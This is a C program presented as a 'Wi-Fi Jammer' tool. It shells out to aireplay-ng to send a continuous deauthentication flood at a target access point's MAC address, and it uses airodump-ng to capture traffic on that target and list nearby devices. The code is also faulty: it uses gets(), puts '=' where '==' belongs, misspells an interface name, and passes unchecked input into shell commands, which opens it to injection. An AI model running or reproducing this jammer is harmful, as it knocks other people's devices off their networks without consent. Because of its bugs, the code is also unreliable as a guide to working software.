#include<stdio.h>
#include<stdlib.h>
#include<string.h>
int jammer(char*);
capiture_data_before_jammer(char*,char*);
int dump(void);
int main()

{     
    char mac[20];
    char channel[10];
    int task=1;
      system("clear");
      printf("\033[36m\n\t\t\t   W   E   L   C   O   M   E\n");
      system("figlet Wi-Fi Jammer  !");
      printf("\t\t\033[31m @Mohammad Aarquam copyright,All right reserved! 24/06/2020");  
      printf("\n\n\033[33mMac Adress :");
      gets(mac);
      printf("\nchannel number :");
      gets(channel);
      printf("\n\n[1] dumping..,. Near by devices..");
      printf("\n[2]capiture_data_before_jammer\n");
      printf("[3]now jammer attack !\n\n");
      scanf("%d",&task);

 if (task==1)
 {
     dump();
 }
 
else if (task==2)
{
    capiture_data_before_jammer(channel,mac);
}
else if (task==3)

{
   jammer(mac);

}   
      //jammer(1,mac);

    return 0;
}

int jammer(char *mac_ptr){
    int option;
/////////////////////////////////
//                             //
//  command section            //
//                             //
/////////////////////////////////
    
   
    char command[70]="aireplay-ng -0 0 -a ";
    strcat(command,mac_ptr);

    printf("%s",command);
    printf("\nselect interface for making jammer...\n");
    printf("\n[1] wlan0 \n");
    printf("[2] wlan1\n\n");


    option=scanf("%d",&option);
    if (option=2)
    {
        strcat(command," wlan0mon");
        
        system(command);
        return 1;
    }
    
    else if (option!=2)
    {
        strcat(command," wlan1mon");
        system(command);
        return 1;
    }
    
    return 0;



}




int capiture_data_before_jammer(char *ch,char *ma_add){
     char command[100]="airodump-ng -c ";
     int opt;
     strcat(command,ch);
     strcat(command," --bssid ");
     strcat(command,ma_add);
     printf("\nselect interface for making jammer...\n");
     printf("\n[1] wlan0 \n");
     printf("[2] wlan1\n\n");
     opt=scanf("%d",&opt);


     if (opt=2){

        strcat(command," wlan0mon");
       
        system(command);
        return 1;
    }
    
    else if (opt!=2)
    {
        strcat(command," wlan1mon");
        system(command);
        return 1;
    }
    


return 0;


}

int dump(){
     int opt_inte;
     printf("\nselect interface for making jammer...\n");
     printf("\n[1] wlan0 \n");
     printf("[2] wlan1\n\n");
     opt_inte=scanf("%d",&opt_inte);
     if (opt_inte=1)
     {
        system("airodump-ng wlam0mon");
        return 1;
    }
    
    else if (opt_inte==2)
    {
        
        system("airodump-ng wlan1mon");
        return 1;
    }
    

    
     return 0;

}
/*
        black='\033[30m'

        red='\033[31m'

        green='\033[32m'

        orange='\033[33m'

        blue='\033[34m'

        purple='\033[35m'

        cyan='\033[36m'

        lightgrey='\033[37m'

        darkgrey='\033[90m'

        lightred='\033[91m'

        lightgreen='\033[92m'

        yellow='\033[93m'

        lightblue='\033[94m'

        pink='\033[95m'
        lightcyan='\033[96m'
        
         
      """
      */